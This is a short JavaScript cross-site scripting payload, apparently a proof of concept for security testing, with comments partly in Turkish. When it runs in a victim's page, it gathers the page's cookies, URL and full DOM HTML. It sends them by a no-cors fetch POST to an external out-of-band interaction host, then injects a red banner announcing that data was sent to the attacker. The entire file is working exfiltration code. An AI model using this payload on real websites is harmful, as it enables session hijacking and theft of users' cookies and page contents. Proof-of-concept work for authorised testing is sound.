// atestADV
(function(){
  // Veri toplama
  const data = {
    cookies: document.cookie,
    url: location.href,
    dom: document.documentElement.innerHTML,
    timestamp: Date.now()
  };
  
  // data exfiltrate 
  const exfilUrl = 'https://lwsxretelikokvvvcthestrd8f12qfupl.oast.fun';
  fetch(exfilUrl, {
    method: 'POST',
    body: JSON.stringify(data),
    mode: 'no-cors'
  });
  
  // 
  document.body.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:20px;z-index:9999">
      XSS PoC EXECUTED! Data sent to attacker
    </div>
  ` + document.body.innerHTML;
})();